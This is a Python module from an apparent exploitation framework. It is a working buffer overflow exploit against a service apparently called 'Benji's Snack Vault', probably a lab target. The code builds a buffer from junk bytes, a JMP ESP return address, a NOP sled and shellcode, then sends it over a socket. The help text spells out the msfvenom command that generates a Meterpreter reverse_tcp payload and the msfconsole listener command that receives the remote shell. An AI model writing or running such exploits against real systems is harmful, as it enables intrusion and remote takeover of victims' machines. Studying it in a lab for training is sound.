#!/usr/bin/env python3
"""
Benji's Snack Vault - RCE Exploit Module
Final stage: Builds and sends the full exploit buffer to get Meterpreter
"""

import socket
import struct
from base_module import BaseModule
from utils import colored

class BenjisSnackVaultBO(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "benjis_snack_vault_bo"
        self.description = "Buffer overflow exploit - delivers Meterpreter reverse shell"

        self.options = {
            "RHOST": {"value": "192.168.107.132", "required": True, "description": "Target IP"},
            "RPORT": {"value": 9999, "required": True, "description": "Target port"},
            "PREFIX": {"value": "MEOW ", "required": True, "description": "Command prefix"},
            "OFFSET": {"value": 1731, "required": True, "description": "Bytes to EIP (from analysis module)"},
            "RET": {"value": "0x114015f3", "required": True, "description": "JMP ESP address from mona"},
            "NOP_SLED": {"value": 200, "required": False, "description": "NOP sled size for reliability"},
            "PAYLOAD_FILE": {"value": "meterpreter.bin", "required": True, "description": "Path to raw payload file"},
            "CRLF": {"value": True, "required": False, "description": "Append \\r\\n"}
        }

    def show_help(self):
        print(colored("\n=== RCE Exploit Module ===", "yellow"))
        print("Steps before running:")
        print("  1. Generate payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444")
        print("     EXITFUNC=thread -b \"\\x00\\x09\\x0a\\x0d\" -f raw -o meterpreter.bin")
        print("  2. Start listener: msfconsole -q -x \"use multi/handler; set payload windows/meterpreter/reverse_tcp;")
        print("     set LHOST <your_ip>; set LPORT 4444; run\"")
        print("\nThen:")
        print("  set options → run")

    def run(self):
        opts = {k: v["value"] for k, v in self.options.items()}
        rhost = opts["RHOST"]
        rport = int(opts["RPORT"])
        prefix = opts["PREFIX"]
        offset = int(opts["OFFSET"])
        ret = int(opts["RET"], 16)          # Convert hex string to int
        nop_sled = int(opts["NOP_SLED"])
        payload_file = opts["PAYLOAD_FILE"]

        print(colored("[*] Loading payload...", "yellow"))
        try:
            with open(payload_file, "rb") as f:
                payload = f.read()
            print(colored(f"[+] Loaded {len(payload)} byte payload", "green"))
        except FileNotFoundError:
            print(colored(f"[-] {payload_file} not found!", "red"))
            print("Generate it first with msfvenom (see help)")
            return

        # === Build the exploit buffer ===
        junk = b"A" * offset
        ret_bytes = struct.pack("<I", ret)          # Little-endian JMP ESP address
        nops = b"\x90" * nop_sled
        crlf = b"\r\n" if opts["CRLF"] else b""

        buffer = prefix.encode() + junk + ret_bytes + nops + payload + crlf

        print(colored(f"[*] Sending exploit buffer ({len(buffer)} bytes)...", "yellow"))

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((rhost, rport))
            s.send(buffer)
            s.close()
            print(colored("[+] Exploit sent successfully!", "green"))
            print(colored("Check your Metasploit handler for the Meterpreter session.", "yellow"))
        except Exception as e:
            print(colored(f"[-] Send failed: {e}", "red"))
            print("Make sure the app is running and listening on 9999")

    def handle_command(self, cmd):
        if cmd.strip().lower() == "run":
            self.run()
            return
        super().handle_command(cmd)